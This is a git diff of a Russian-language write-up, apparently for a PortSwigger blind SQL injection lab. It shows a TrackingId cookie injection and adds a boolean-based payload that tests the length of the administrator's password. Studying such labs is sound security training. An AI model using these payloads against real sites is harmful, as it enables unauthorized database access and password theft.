@@ -31,4 +31,12 @@ Cookie: TrackingId=3wTxErmW7fI7fcZM' and 1=0--;
 
 Видим, что в ответе нет `Welcome Back!`
 
+Далее делаем запрос для определения количества символов пароля:
 
+```sql
+AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
+
+![PortSwigger](../Drawing/Drawing_16.png)
+
+![PortSwigger](../Drawing/Drawing_17.png)
